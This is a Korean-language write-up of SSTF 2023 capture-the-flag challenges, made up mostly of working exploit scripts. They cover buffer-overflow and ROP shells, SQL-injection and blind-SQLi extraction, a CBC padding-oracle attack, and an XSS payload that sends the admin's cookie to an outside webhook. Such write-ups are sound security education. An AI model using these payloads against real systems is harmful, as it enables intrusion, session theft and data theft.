# SSTF 2023 write up

## PWN - BOF 101

---

```python
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

void printflag(){ 
	char buf[32];
	int fd = open("/flag", O_RDONLY);
	read(fd, buf, sizeof(buf));
	close(fd);
	puts(buf);
}

int main() {
	int check=0xdeadbeef;
	char name[140];
	printf("printflag()'s addr: %p\n", &printflag);
	printf("What is your name?\n: ");
	scanf("%s", name);	
	if (check != 0xdeadbeef){
		printf("[Warning!] BOF detected!\n");
		exit(0);
	}
	return 0;
}
```

check로 할당된 mitigation을 bypass하고 BOF하는 문제다.

솔루션은 mitigation을 bypass하는 동시에 RET을 `printflag()` 주소로 덮어쓰도록 payload를 작성하고 전송하면 된다.

### ○ exploit

```python
from pwn import *
import warnings

warnings.filterwarnings('ignore')

#context.log_level = 'debug' 

p = remote("bof101.sstf.site", 1337)   
#p = process("./bof101")

#pause()

# dummy + check + SFP + RET
payload = b'a'*(0x90-0x4) + p32(0xdeadbeef) + b'a'*0x8 + p64(0x4011f6)

p.sendlineafter(b'\n', payload)

p.interactive()
```

## PWN - BOF 102

---

```python
#include <stdio.h>
#include <stdlib.h>

char name[16];

void bofme() {
	char payload[16];

	puts("What's your name?");
	printf("Name > ");
	scanf("%16s", name);
	printf("Hello, %s.\n", name);

	puts("Do you wanna build a snowman?");
	printf(" > ");
	scanf("%s", payload);
	printf("!!!%s!!!\n", payload);
	puts("Good.");
}

int main() {
	system("echo 'Welcome to BOF 102!'");
	bofme();
	return 0;
}
```

`system()`이 사용됐다. 따라서 `system PLT`가 존재하고 전역변수 name을 통해 인자인 `/bin/sh` 를 저장할 수 있다. 

ROP exploit을 수행하여 `system(”/bin/sh”)`를 완성하고 실행하면 된다.

### ○ exploit

```python
from pwn import *
import warnings

warnings.filterwarnings('ignore')

#context.log_level = 'debug' 
#context.bits = 64

p = remote("bof102.sstf.site", 1337)   
#p = process("./bof102")

# dummy + system + dummy + [name == "/bin/sh"]
payload = b'a'*(0x10+0x4) + p32(0x8048430) + b'a'*0x4 + p64(0x0804a06c)

p.sendlineafter(b'\n', b'/bin/sh\x00')
p.sendlineafter(b'\n', payload)

p.interactive()
```

## PWN - BOF 103

---

```python
unsigned long long key;

void useme(unsigned long long a, 
        unsigned long long b)
{
    key = a * b;
}

void bofme() {
    char name[16];
    puts("What's your name?");
    printf("Name > ");
    scanf("%s", name);
    printf("Bye, %s.\n", name);
}
```

ROP exploit 문제다.

전역변수 key에 `sh` 를 삽입하고 ROP로 `system(”sh”)`를 실행하면 된다.

단, ROP로 `useme()` 를 호출하는 과정에서 인자 `a, b`가 long 타입이므로 형 변환을 고려해서 인자를 호출해야한다.

### ○ exploit

```python
from pwn import *
import warnings

warnings.filterwarnings('ignore')

#context.log_level = 'debug' 
context.bits = 64

p = remote("bof103.sstf.site", 1337)   
#p = process("./bof103")

pause()
pop_rdi = 0x400723
pop_rsi = 0x4006b8
key = 0x601058
syetem = 0x4004e0
ret = 0x4004b1
useme = 0x400626

# dummy + rdi + 1 + rsi + "sh" + useme() + rdi + key + system()
payload = b'a'*(0x10+0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(26739) + p64(useme) + p64(pop_rdi) + p64(key) + p64(0x4004e0)

p.sendlineafter(b'\n', payload)

p.interactive()
```

## PWN - BOF 104

---

파일로 libc와 ELF 파일이 주어진다.

```python
int bofme()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  read(0, buf, 0x200uLL);
  return puts(buf);
}
```

BOF만 하면 되는 문제 같지만, `system PLT`가 없고 쉘을 실행하는 함수 같은 것도 없다.

따라서 ROP exploit으로 `libc_base`를 알아내서 system 주소를 구하는 작업과 `system(”/bin/sh”)`를 실행하는 작업이 필요하다.

필자는 1번째 ROP chain으로 `put(stdin)`을 실행하여, `libc_base`를 구하고 `bofme()` 시작 주소로 리턴했다. 

다음으로 2번째 ROP chain으로 `system(”/bin/sh”)`를 실행했다.

2번째 ROP 과정에서 `movasp` 에러가 발생함으로 ret 가젯을 사용해서 해결해줘야 한다.

### ○ exploit

```python
from pwn import *
import warnings

warnings.filterwarnings('ignore')

#context.log_level = 'debug' 

p = remote("bof104.sstf.site", 1337)   
#p = process("./bof104", env = {"LD_PRELOAD":"./libc.so.6"})

pop_rdi = 0x401263
pop_rsi_r15 = 0x401261
bss = 0x404040
read_plt = 0x401070
puts_plt = 0x401060
puts_got = 0x404018
stdin = 0x404050
ret = 0x40101a

# Leak libc_base
payload = b'a'*(0x20+0x8)
payload += p64(pop_rdi) + p64(stdin) + p64(puts_plt) 
payload += p64(0x40117A) # bofme()

p.sendline(payload)
p.recvuntil('\n')

libc_base  = u64(p.recv(6)+b'\x00\x00') - 0x219AA0
system = libc_base + 0x50D60
bin_sh = libc_base + 0x1D8698

print(hex(libc_base))

# solve movaps & ROP exploit
payload = b'a'*(0x20+0x8)
payload += p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendline(payload)

p.interactive()
```

## **PWN - 2 Outs in the Ninth Inning**

---

```c
unsigned __int64 __fastcall showFuncAddr(void *a1)
{
  void *v2; // [rsp+18h] [rbp-38h]
  char s[40]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf(" > ");
  fgets(s, 32, stdin);
  if ( s[strlen(s) - 1] == 10 )
    s[strlen(s) - 1] = 0;
  v2 = dlsym(a1, s);
  if ( v2 )
    printf(" Libc function '%s' is at %p.\n", s, v2);
  else
    printf(" Libc doesn't have function '%s'.\n", s);
  return v4 - __readfsqword(0x28u);
}
```

`showFuncAddr()`을 이용해서 libc에 정의된 원하는 함수 주소를 획득할 수 있다.

![Untitled](SSTF%202023%20write%20up%204963128224b94fa58c699069450294ac/Untitled.png)

이 기능을 활용해서 [그림]과 같이 libc 파일을 추측한다.

```python
char v6[8]; // [rsp+8h] [rbp-38h] BYREF
int (**v7)(const char *, ...); // [rsp+10h] [rbp-30h]
...
fgets(v6, 16, stdin);
...
((void (*)(const char *, ...))v7)(" Struck out. Game Over - You got %d hits and %d runs.\n", v8, v9);
```

`main()`에서 BOF 취약점이 발생하는 부분으로 v6를 입력해서 v7을 덮어쓸 수 있다.

마침 v7으로 실행하는 함수의 인자 v8과 v9는 0이므로 oneshot 가젯을 이용해서 쉘을 획득할 수 있다.

![Untitled](SSTF%202023%20write%20up%204963128224b94fa58c699069450294ac/Untitled%201.png)

[그림]의 oneshot 가젯이 조건에 딱 맞는다. 

v7을 해당 oneshot 가젯으로 덮어쓰면 쉘을 획득할 수 있다.

### ○ exploit

```python
from pwn import *
import warnings

warnings.filterwarnings('ignore')

#context.log_level = 'debug' 

p = remote("2outs.sstf.site", 1337)   
#p = process("./9end2outs")

#pause()
# Leak libc
p.sendlineafter("> ", "system")
p.recvuntil("at ")
system = p.recv(14).decode()
libc_base = int(system, 16) - 0x50d60
print(hex(libc_base))

oneshot = libc_base + 0xebcf8

p.sendlineafter("> ", "printf")

# Exploit by oneshot
payload = b'a'*8 + p64(oneshot)
p.sendlineafter("> ", payload)

p.interactive()
```

## WEB - SQLi 101

---

admin 필터링을 우회하고 admin으로 로그인하는 문제다.

```python
id : 1

pw : 1' union select 0x61646d696e#

# Complete SQL query
select id from users where id='1' and pw='1' union select 0x61646d696e#'
```

위와 같이 로그인하면 된다.

## WEB - SQLi 102

---

검색 기능이 구현된 페이지로 SQLi가 가능하다.

```python
123%' union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_schema=database()#
```

![Untitled](SSTF%202023%20write%20up%204963128224b94fa58c699069450294ac/Untitled%202.png)

`union SQLi`를 수행하여 메타데이터에 정의된 column을 읽으면 FLAG를 획득할 수 있다.

## WEB - XSS 101

---

로그인 기능과 함께 admin에게 메일을 보낼 수 있는 기능이 있다.

```python
<script>location.href='https://webhook.site/d8808303-68e8-429c-a1ed-f47ba28d5c81/?'.concat(document.cookie)</script>
```

XSS 페이로드로 admin의 `PHPSESSID`를 탈취한다.

![Untitled](SSTF%202023%20write%20up%204963128224b94fa58c699069450294ac/Untitled%203.png)

다음으로 `PHPSESSID`를 admin으로 바꾸고 `/admin.php`라는 숨은 경로에 접속하면 flag를 획득할 수 있다.

## WEB - Libreria

---

간단하게 설명하면, 서점 페이지가 구현되어있다.

```python
case 'requestbook':
	if ((isset($_GET['isbn']) && strlen($_GET['isbn']) >= 10)) {
		$res = '{"res": "Sorry, but our budget is not enough to buy <a href=\'https://isbnsearch.org/isbn/'.$_GET['isbn'].'\'>this book</a>."}';
		$db = dbconnect();
		$result = pg_query($db, "SELECT ISBN FROM books WHERE isbn='".$_GET['isbn']."'");
		pg_close($db);
		if ($result) {
			$rows = pg_fetch_assoc($result);
			if ($rows) {
				$isbn = (int)$rows["isbn"];
				if (($isbn >= 1000000000) && ((string)$isbn === $rows["isbn"]))
				{
					$res = '{"res": "We already have this book('.$rows["isbn"].')."}';
				}
			}
		}
	}
```

핵심은 `requestbook` 부분이다.

`prepare statement`가 적용되어있지 않아서 SQLi가 가능하다. `pg_query()`를 사용하고 있는 것으로 볼 때, `postgre SQL`을 사용한다는 것을 알 수 있다. 

```python
$isbn = (int)$rows["isbn"];
if (($isbn >= 1000000000) && ((string)$isbn === $rows["isbn"]))
{
	$res = '{"res": "We already have this book('.$rows["isbn"].')."}';
}
```

조건문을 보면 쿼리의 결과가 `($isbn >= 1000000000)`이라는 조건을 만족해야한다.

따라서 SQLi로 DB 데이터를 화면에 출력할 수 없다. 

조건을 만족 시키면서 SQLi를 하기 위해서는 `blind SQLi`를 진행해야한다.

```python
union select case when

# example
union select case when (substring(STRING_AGG(table_name, ','),{i},1)='{j}') then 1111111111111 else 2222222222222 end from information_schema.tables where current_database() = 'books'
```

`postgre SQL`에서는 위와 같은 문법이 존재한다.

간단하게 설명하면, where 절에서 사용하는 조건문을 select문에서 사용할 수 있는 문법이라고 생각하면된다.

해당 문법을 이용해서 Blind SQLi를 쉽게 수행할 수 있다.

### ○ exploit

```python
from requests import *
import string

uppercase_letters = string.ascii_uppercase
lowercase_letters = string.ascii_lowercase
special_characters = "!@#$%^&*"
numbers = "0123456789"

combined_string = ',{' + '}' + lowercase_letters + uppercase_letters + special_characters + numbers + ' '
#print(combined_string)

url = 'http://libreria.sstf.site/rest.php?cmd=requestbook&isbn='
last_idx = 363

print('[+] start exploit!')

count = 0
table = ''
check_false = 0

# Get table
for i in range(1, 100):
  if check_false:
    print()
    print('[-] finish')
    break 
  for j in list(combined_string):
    payload = f'''123' union select case when (substring(STRING_AGG(table_name, ','),{i},1)='{j}') then 1111111111111 else 2222222222222 end from information_schema.tables where current_database() = 'books'-- '''
    res = get(url=url+payload)
    count += 1
    #print(f'..ing..{count}')
    if res.text.find('1111111111111') != -1:
      count = 0
      #print(j)
      table += j
      print(table)
      break
    elif j == ' ':
      check_false = 1
      break

count = 0    
column = ''
check_false = 0

# Get column
for i in range(5, 100):
  if check_false:
    print()
    print('[-] finish')
    break 
  for j in list(combined_string):
    payload = f'''123' union select case when (substring(STRING_AGG(column_name, ','),{i},1)='{j}') then 1111111111111 else 2222222222222 end from information_schema.columns where table_name = 'adminonly'-- '''
    res = get(url=url+payload)
    count += 1
    #print(f'..ing..{count}')
    if res.text.find('1111111111111') != -1:
      count = 0
      #print(j)
      column += j
      print(column)
      break
    elif j == ' ':
      check_false = 1
      break

count = 0    
flag = ''
check_false = 0

# Get flag
# start flag index is 11 -> Guess next query
'''
123' union select case when (substring(STRING_AGG(value, ','),{i},1)='S') then 1111111111111 else 2222222222222 end from adminonly--
''' 
for i in range(11, 100):
  if check_false:
    print()
    print('[-] finish')
    break 
  for j in list(combined_string):
    payload = f'''123' union select case when (substring(STRING_AGG(value, ','),{i},1)='{j}') then 1111111111111 else 2222222222222 end from adminonly-- '''
    res = get(url=url+payload)
    count += 1
    #print(f'..ing..{count}')
    if res.text.find('1111111111111') != -1:
      count = 0
      #print(j)
      flag += j
      print(flag)
      break
    elif j == ' ':
      check_false = 1
      break

'''
# another test query

123' union select case when (char_length(title)>0) then 1111111111111 else 2222222222222 end from books where idx=364-- 

123' union select case when (char_length(STRING_AGG(column_name, ', '))>0) then 1111111111111 else 2222222222222 end from information_schema.columns where table_name = 'books'-- 

123' union select case when (position('SCTF' IN STRING_AGG(table_name, ',')) > 0) then 1111111111111 else 2222222222222 end from information_schema.tables-- 

123' union select case when (substring(STRING_AGG(table_name, ','),{i},1)='{j}') then 1111111111111 else 2222222222222 end from information_schema.tables where current_database() = 'books'-- 

123' union select case when (substring(STRING_AGG(column_name, ','),{i},1)='{j}') then 1111111111111 else 2222222222222 end from information_schema.columns where table_name = 'adminonly'--

123' union select case when (substring(STRING_AGG(key, ','),{i},1)='{j}') then 1111111111111 else 2222222222222 end from adminonly--

123' union select case when (position('SCTF' IN STRING_AGG(key, ',')) > 0) then 1111111111111 else 2222222222222 end from adminonly-- 

123' union select case when (position('SCTF' IN STRING_AGG(value, ',')) > 0) then 1111111111111 else 2222222222222 end from adminonly-- 

'''
```

Blind SQLi로 DB 데이터를 알아내고 flag까지 도달하는 코드다.

```python
SCTF{SQL_i5_4_l4n9uage_t0_man4G3_d4ta_1n_Da7aba$e5}
```

`+` 간단하게 sqlmap으로 풀 수 있는 문제였다는 사실에 충격 ㅠ

## **WEB - Libreria Pro**

---

Libreria 문제와 마찬가지로 서점 페이지가 구현되있다.

```python
/isbnsearch/%7B%%20debug%20%%7D
```

위와 같이 접속하면

![Untitled](SSTF%202023%20write%20up%204963128224b94fa58c699069450294ac/Untitled%204.png)

[그림]처럼 `Django 디버그 모드`와 관련된 에러가 발생한다.

Django 디버그와 관련된 SQLi를 검색해보면

[https://github.com/advisories/GHSA-pghf-347x-c2gj](https://github.com/advisories/GHSA-pghf-347x-c2gj)

`CVE-2021-30459`가 검색된다.

간단하게 설명하면 `Django 디버그 모드` 와 관련된 SQLi 취약점이다.

이후에는 시간 관계로 exploit까지 진행하지는 못했지만 예상대로였다.

요약하면 다음과 같다.

`search_with=year` 뒤에 `‘`를 삽입하면 Django 디버그 페이지에서 소스 코드와 SQL 쿼리 문자열을 부분적으로 유출할 수 있다. 해당 문제는 SQLi 취약점이 있는 `Django 버전 4.0.5`를 사용한다. 따라서 필터를 우회하면서 Blind SQLi를 통해 데이터베이스에 저장된 데이터를 출력하여 플래그를 얻을 수 있다.

## Crypto - AES 101

---

**AES CBC Padding Oracle Attack**과 관련된 문제다.

### ○ solve

```python
#SCTF{CBC_p4dd1n9_0racle_477ack_5tArts_h3re}
from pwn import *

sendlineafter = lambda r,ch,data:[r.read_until(ch), r.write(data+b"\n")]

target_msg = b"CBC Magic!" +b"\x06"*6
r = remote("aes.sstf.site",1337)

ip =b''
for i in range(1,17):
    payload = bytearray(b"A"*(17-i))
    padding = bytes([c ^ i for c in ip])
    for j in range(256):
        payload[-1] = j
        iv = payload + padding
        r.sendlineafter(b": ",iv.hex().encode())
        r.sendlineafter(b": ",b"41"*16)
        res = r.recvline()
        if b"Try again." not in res:
            ip = bytes([j ^i]) + ip
            print(i)
            break

iv = bytes([x^y for x,y in zip(ip,target_msg)])

r.sendlineafter(b": ",iv.hex().encode())
r.sendlineafter(b": ",b"41"*16)
print(r.readline().decode())
```
